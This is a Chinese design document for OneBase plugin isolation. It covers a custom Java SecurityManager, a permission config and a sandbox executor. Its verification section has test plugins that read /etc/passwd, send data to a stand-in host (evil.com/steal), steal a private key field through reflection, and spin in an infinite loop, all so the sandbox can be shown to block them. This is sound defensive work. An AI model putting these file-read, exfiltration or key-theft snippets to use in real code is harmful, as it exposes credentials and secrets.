# OneBase 插件安全隔离方案澄清与 Demo 设计

> 最后更新: 2026-01-11
> 文档版本: 1.0

---

## 1. JVM-Sandbox 用途澄清

### 1.1 JVM-Sandbox 实际用途

**JVM-Sandbox** 是阿里巴巴开源的一个 **实时无侵入 AOP 框架**，而不是用于安全隔离的沙箱。

**核心能力:**
- ✅ **AOP 代码增强**: 对运行中的 Java 应用进行方法拦截和增强
- ✅ **热插拔**: 运行时加载/卸载增强模块
- ✅ **故障演练**: 模拟各种故障场景（延迟、异常等）
- ✅ **流量回放**: 录制和回放网络请求
- ✅ **监控观测**: 方法调用监控和统计

**典型应用场景:**
- [x] 线上故障演练（混沌工程）
- [x] APM 监控（应用性能管理）
- [x] 流量回放测试
- [x] 无侵入式日志采集
- [x] 参数校验和权限增强

**不适用场景:**
- ❌ **插件安全隔离**（这是我们的需求）
- ❌ 资源限制（CPU、内存、线程）
- ❌ 权限控制（文件、网络访问）
- ❌ 恶意代码防护

**参考链接:**
- [JVM-Sandbox GitHub](https://github.com/alibaba/jvm-sandbox)
- [JVM-Sandbox 中文用户指南](https://github.com/alibaba/jvm-sandbox/blob/master/doc/JVM-SANDBOX-USER-GUIDE-Chinese.md)

### 1.2 正确的理解

**沙箱隔离 vs AOP 增强:**

| 维度 | JVM-Sandbox (AOP) | 安全沙箱 (隔离) |
|------|-------------------|---------------|
| **用途** | 代码增强和监控 | 安全隔离和防护 |
| **隔离性** | ❌ 不隔离 | ✅ 完全隔离 |
| **资源限制** | ❌ 无限制 | ✅ 有限制 |
| **权限控制** | ❌ 无控制 | ✅ 白名单控制 |
| **适用场景** | 可信代码增强 | 不可信代码隔离 |

---

## 2. OneBase 插件安全需求

### 2.1 安全需求分析

**核心需求:**
1. **资源隔离**: 插件不能耗尽系统资源（CPU、内存、线程）
2. **权限控制**: 插件不能访问敏感资源（文件、网络、数据库）
3. **故障隔离**: 插件崩溃不能影响宿主系统
4. **多租户隔离**: 不同租户的插件互相隔离

### 2.2 可行方案对比

| 方案 | 安全性 | 性能 | 复杂度 | 推荐度 |
|------|--------|------|--------|--------|
| **Java SecurityManager** | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⚠️ 过渡方案 |
| **自定义 SecurityManager** | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | ✅ 推荐 |
| **自定义 ClassLoader** | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ✅ 辅助方案 |
| **进程隔离 (Docker)** | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐ | ⚠️ 特定场景 |
| **WASM** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ | 🔮 未来方向 |

---

## 3. Demo 方案设计

### 3.1 方案一：自定义 SecurityManager（推荐）

**原理:** 通过自定义 SecurityManager 实现插件代码的权限控制。

**优势:**
- ✅ Java 原生支持，无需额外依赖
- ✅ 可以精确控制权限（文件、网络、反射等）
- ✅ 性能开销小
- ✅ 易于实现和调试

**限制:**
- ⚠️ Java 17+ 已弃用，但仍然可用
- ⚠️ 不能限制资源使用（CPU、内存）
- ⚠️ 需要配合其他方案实现完整隔离

**适用场景:**
- 内部开发的可信插件
- 需要快速实施的场景
- 作为过渡方案

### 3.2 方案二：自定义 ClassLoader 隔离

**原理:** 通过自定义 ClassLoader 实现类的隔离加载和访问控制。

**优势:**
- ✅ 完全控制类的加载
- ✅ 可以实现类的黑名单/白名单
- ✅ 性能开销极小
- ✅ 灵活性高

**限制:**
- ⚠️ 只能隔离类加载，不能限制已加载类的使用
- ⚠️ 需要精心设计避免类冲突
- ⚠️ 不能直接限制资源使用

**适用场景:**
- 需要类级别隔离
- 配合 SecurityManager 使用

### 3.3 方案三：资源限制代理

**原理:** 通过代理模式拦截资源密集型操作（线程创建、大对象分配等）。

**优势:**
- ✅ 可以限制线程数
- ✅ 可以监控资源使用
- ✅ 可以实现超时控制

**限制:**
- ⚠️ 实现复杂
- ⚠️ 需要修改插件代码或使用字节码增强
- ⚠️ 不能直接限制 CPU 和内存

**适用场景:**
- 需要资源限制
- 配合其他方案使用

---

## 4. Demo 实现：自定义 SecurityManager

### 4.1 核心设计

**架构设计:**
```
┌─────────────────────────────────────────────────────┐
│                    OneBase 宿主                      │
│  ┌───────────────────────────────────────────────┐  │
│  │         PluginSecurityManager                 │  │
│  │  - 权限白名单                                  │  │
│  │  - 资源监控                                    │  │
│  │  - 事件日志                                    │  │
│  └───────────────────────────────────────────────┘  │
│           │                           │              │
│           ▼                           ▼              │
│  ┌────────────────┐         ┌────────────────┐      │
│  │   Plugin A     │         │   Plugin B     │      │
│  │  (受限环境)     │         │  (受限环境)     │      │
│  └────────────────┘         └────────────────┘      │
└─────────────────────────────────────────────────────┘
```

**核心接口:**
```java
public interface PluginSandbox {
    /**
     * 在沙箱中执行插件代码
     * @param pluginId 插件ID
     * @param callable 要执行的代码
     * @return 执行结果
     */
    <T> SandboxResult<T> execute(String pluginId, Callable<T> callable);

    /**
     * 配置插件权限
     * @param pluginId 插件ID
     * @param permissions 权限配置
     */
    void configurePermissions(String pluginId, PluginPermissions permissions);

    /**
     * 获取插件资源使用情况
     * @param pluginId 插件ID
     * @return 资源使用统计
     */
    PluginResourceStats getResourceStats(String pluginId);
}
```

### 4.2 实现步骤

#### Step 1: 创建自定义 SecurityManager

```java
/**
 * 插件安全管理器
 * 用于控制插件代码的权限
 */
public class PluginSecurityManager extends SecurityManager {

    private final ThreadLocal<Boolean> inPlugin = ThreadLocal.withInitial(() -> false);
    private final ThreadLocal<String> currentPluginId = new ThreadLocal<>();
    private final Map<String, PluginPermissions> pluginPermissions = new ConcurrentHashMap<>();

    /**
     * 进入插件沙箱
     * @param pluginId 插件ID
     */
    public void enterSandbox(String pluginId) {
        inPlugin.set(true);
        currentPluginId.set(pluginId);
    }

    /**
     * 退出插件沙箱
     */
    public void exitSandbox() {
        inPlugin.set(false);
        currentPluginId.remove();
    }

    /**
     * 检查当前是否在插件沙箱中
     */
    public boolean isInSandbox() {
        return inPlugin.get();
    }

    /**
     * 获取当前插件ID
     */
    public String getCurrentPluginId() {
        return currentPluginId.get();
    }

    @Override
    public void checkPermission(Permission perm) {
        // 只检查插件代码的权限
        if (!isInSandbox()) {
            return; // 宿主代码不做限制
        }

        String pluginId = getCurrentPluginId();
        PluginPermissions permissions = pluginPermissions.get(pluginId);

        if (permissions == null) {
            throw new SecurityException("插件未配置权限: " + pluginId);
        }

        // 检查具体权限
        if (perm instanceof FilePermission) {
            checkFilePermission((FilePermission) perm, permissions);
        } else if (perm instanceof SocketPermission) {
            checkSocketPermission((SocketPermission) perm, permissions);
        } else if (perm instanceof ReflectPermission) {
            checkReflectionPermission(perm, permissions);
        } else if (perm instanceof RuntimePermission) {
            checkRuntimePermission((RuntimePermission) perm, permissions);
        } else {
            // 默认拒绝
            throw new SecurityException("插件禁止此操作: " + perm);
        }
    }

    private void checkFilePermission(FilePermission perm, PluginPermissions permissions) {
        if (!permissions.allowFileRead() && perm.getActions().contains("read")) {
            throw new SecurityException("插件禁止读文件");
        }
        if (!permissions.allowFileWrite() && perm.getActions().contains("write")) {
            throw new SecurityException("插件禁止写文件");
        }
        if (!permissions.allowFileDelete() && perm.getActions().contains("delete")) {
            throw new SecurityException("插件禁止删除文件");
        }
    }

    private void checkSocketPermission(SocketPermission perm, PluginPermissions permissions) {
        if (!permissions.allowNetwork()) {
            throw new SecurityException("插件禁止网络操作");
        }
    }

    private void checkReflectionPermission(Permission perm, PluginPermissions permissions) {
        if (!permissions.allowReflection()) {
            throw new SecurityException("插件禁止反射");
        }
    }

    private void checkRuntimePermission(RuntimePermission perm, PluginPermissions permissions) {
        String name = perm.getName();
        if ("createClassLoader".equals(name) && !permissions.allowCreateClassLoader()) {
            throw new SecurityException("插件禁止创建类加载器");
        }
        if ("modifyThread".equals(name) && !permissions.allowModifyThread()) {
            throw new SecurityException("插件禁止修改线程");
        }
        if ("modifyThreadGroup".equals(name) && !permissions.allowModifyThreadGroup()) {
            throw new SecurityException("插件禁止修改线程组");
        }
    }

    /**
     * 配置插件权限
     */
    public void configurePlugin(String pluginId, PluginPermissions permissions) {
        pluginPermissions.put(pluginId, permissions);
    }

    /**
     * 移除插件配置
     */
    public void removePlugin(String pluginId) {
        pluginPermissions.remove(pluginId);
    }
}
```

#### Step 2: 定义权限配置

```java
/**
 * 插件权限配置
 */
@Data
@Configuration
@ConfigurationProperties(prefix = "onebase.plugin.sandbox")
public class PluginPermissions {

    /**
     * 默认权限配置
     */
    private static PluginPermissions defaultPermissions;

    /**
     * 是否允许文件读取
     */
    private boolean allowFileRead = false;

    /**
     * 是否允许文件写入
     */
    private boolean allowFileWrite = false;

    /**
     * 是否允许文件删除
     */
    private boolean allowFileDelete = false;

    /**
     * 是否允许网络操作
     */
    private boolean allowNetwork = false;

    /**
     * 是否允许反射
     */
    private boolean allowReflection = false;

    /**
     * 是否允许创建类加载器
     */
    private boolean allowCreateClassLoader = false;

    /**
     * 是否允许修改线程
     */
    private boolean allowModifyThread = false;

    /**
     * 是否允许修改线程组
     */
    private boolean allowModifyThreadGroup = false;

    /**
     * 最大执行时间（毫秒）
     */
    private long maxExecutionTime = 60000; // 1分钟

    /**
     * 最大线程数
     */
    private int maxThreads = 10;

    public static PluginPermissions getDefault() {
        if (defaultPermissions == null) {
            defaultPermissions = new PluginPermissions();
        }
        return defaultPermissions;
    }
}
```

#### Step 3: 实现沙箱执行器

```java
/**
 * 插件沙箱执行器
 */
@Component
@Slf4j
public class PluginSandboxExecutor {

    @Autowired
    private PluginSecurityManager securityManager;

    @Autowired
    private PluginPermissionConfig permissionConfig;

    /**
     * 在沙箱中执行插件代码
     * @param pluginId 插件ID
     * @param callable 要执行的代码
     * @return 执行结果
     */
    public <T> SandboxResult<T> execute(String pluginId, Callable<T> callable) {
        long startTime = System.currentTimeMillis();

        try {
            // 1. 配置权限
            PluginPermissions permissions = permissionConfig.getPermissions(pluginId);
            securityManager.configurePlugin(pluginId, permissions);

            // 2. 进入沙箱
            securityManager.enterSandbox(pluginId);

            // 3. 执行代码（带超时控制）
            ExecutorService executor = Executors.newSingleThreadExecutor();
            Future<T> future = executor.submit(callable);

            try {
                T result = future.get(permissions.getMaxExecutionTime(), TimeUnit.MILLISECONDS);
                long duration = System.currentTimeMillis() - startTime;

                return SandboxResult.success(result, duration);
            } catch (TimeoutException e) {
                future.cancel(true);
                return SandboxResult.timeout("执行超时");
            } finally {
                executor.shutdown();
            }

        } catch (SecurityException e) {
            log.warn("插件安全违规: pluginId={}, error={}", pluginId, e.getMessage());
            return SandboxResult.securityViolation(e.getMessage());
        } catch (Exception e) {
            log.error("插件执行异常: pluginId={}", pluginId, e);
            return SandboxResult.error(e.getMessage());
        } finally {
            // 4. 退出沙箱
            securityManager.exitSandbox();
        }
    }
}
```

#### Step 4: 集成到插件管理器

```java
/**
 * 集成沙箱的插件管理器
 */
public class SandboxPluginManager extends OneBasePluginManager {

    @Autowired
    private PluginSandboxExecutor sandboxExecutor;

    @Override
    public PluginState startPlugin(String pluginId) {
        // 在沙箱中启动插件
        SandboxResult<PluginState> result = sandboxExecutor.execute(pluginId, () -> {
            return super.startPlugin(pluginId);
        });

        if (result.isSuccess()) {
            return result.getData();
        } else {
            throw new PluginStartException("插件启动失败: " + result.getError());
        }
    }

    @Override
    public PluginState stopPlugin(String pluginId) {
        // 在沙箱中停止插件
        SandboxResult<PluginState> result = sandboxExecutor.execute(pluginId, () -> {
            return super.stopPlugin(pluginId);
        });

        if (result.isSuccess()) {
            return result.getData();
        } else {
            throw new PluginStopException("插件停止失败: " + result.getError());
        }
    }
}
```

### 4.3 配置文件

```yaml
# application.yml
onebase:
  plugin:
    sandbox:
      enabled: true
      # 默认权限配置
      default-permissions:
        allow-file-read: false
        allow-file-write: false
        allow-file-delete: false
        allow-network: false
        allow-reflection: false
        allow-create-classloader: false
        allow-modify-thread: false
        allow-modify-threadgroup: false
        max-execution-time: 60000  # 1分钟
        max-threads: 10

      # 插件特定权限配置
      plugin-permissions:
        trusted-plugin:
          allow-file-read: true
          allow-network: true
          allow-reflection: true
```

---

## 5. Demo 验证计划

### 5.1 验证场景

#### 场景 1: 文件访问控制

```java
@RestController
@RequestMapping("/plugin/malicious/api")
public class MaliciousPlugin implements HttpHandler {

    @GetMapping("/steal-file")
    public String stealFile() {
        try {
            // 尝试读取敏感文件
            String content = Files.readString(Path.of("/etc/passwd"));
            return "文件内容: " + content;
        } catch (SecurityException e) {
            return "安全拦截成功: " + e.getMessage();
        }
    }
}
```

**预期结果:** 抛出 `SecurityException: 插件禁止读文件`

#### 场景 2: 网络访问控制

```java
@GetMapping("/external-call")
public String externalCall() {
    try {
        // 尝试访问外部网络
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create("https://evil.com/steal"))
            .build();
        HttpResponse<String> response = client.send(request,
            HttpResponse.BodyHandlers.ofString());
        return "数据已外泄: " + response.body();
    } catch (SecurityException e) {
        return "安全拦截成功: " + e.getMessage();
    }
}
```

**预期结果:** 抛出 `SecurityException: 插件禁止网络操作`

#### 场景 3: 反射访问控制

```java
@GetMapping("/reflect-attack")
public String reflectAttack() {
    try {
        // 尝试通过反射访问私有字段
        Field field = InternalService.class.getDeclaredField("secretKey");
        field.setAccessible(true);
        String key = (String) field.get(internalService);
        return "密钥已窃取: " + key;
    } catch (SecurityException e) {
        return "安全拦截成功: " + e.getMessage();
    }
}
```

**预期结果:** 抛出 `SecurityException: 插件禁止反射`

#### 场景 4: 执行超时控制

```java
@GetMapping("/infinite-loop")
public String infiniteLoop() {
    // 死循环
    while (true) {
        // 无限循环
    }
}
```

**预期结果:** 超时后中断，返回 `执行超时`

### 5.2 验证步骤

```
1. 创建 Demo 插件模块
2. 实现各种攻击场景
3. 配置沙箱权限
4. 运行验证测试
5. 记录测试结果
```

---

## 6. 总结与建议

### 6.1 关键结论

1. **JVM-Sandbox 不是用于安全隔离的沙箱**
2. **正确的方案是自定义 SecurityManager + ClassLoader**
3. **推荐先实现 SecurityManager 方案作为过渡**

### 6.2 实施建议

#### 短期（2-4周）

- [ ] 实现 `PluginSecurityManager`
- [ ] 实现 `PluginSandboxExecutor`
- [ ] 编写单元测试
- [ ] 创建 Demo 插件验证

#### 中期（1-2个月）

- [ ] 集成到现有插件系统
- [ ] 实现资源监控
- [ ] 完善权限配置
- [ ] 编写使用文档

#### 长期（3-6个月）

- [ ] 考虑进程隔离方案（Docker）
- [ ] 考虑 WASM 方案（未来方向）
- [ ] 建立插件安全认证体系
- [ ] 完善监控和告警

---

**相关文档:**
- [插件安全分析](./plugin-security-analysis.md)
- [插件架构深入分析](./plugin-architecture-deep-dive.md)
- [JVM-Sandbox GitHub](https://github.com/alibaba/jvm-sandbox)
- [Java Security 指南](https://tersesystems.com/blog/2015/12/29/sandbox-experiment/)

**Sources:**
- [JVM-Sandbox User Guide (Chinese)](https://github.com/alibaba/jvm-sandbox/blob/master/doc/JVM-SANDBOX-USER-GUIDE-Chinese.md)
- [How do I create a Java sandbox?](https://stackoverflow.com/questions/1715036/how-do-i-create-a-java-sandbox)
- [Java Security Manager Deprecation](https://www.deep-kondah.com/java-security-manager-is-getting-removed/)
- [Self-Protecting Sandbox using SecurityManager](https://tersesystems.com/blog/2015/12/29/sandbox-experiment/)
- [彻底搞懂JVM-SANDBOX类隔离](https://blog.csdn.net/gitblog_00802/article/details/151709792)
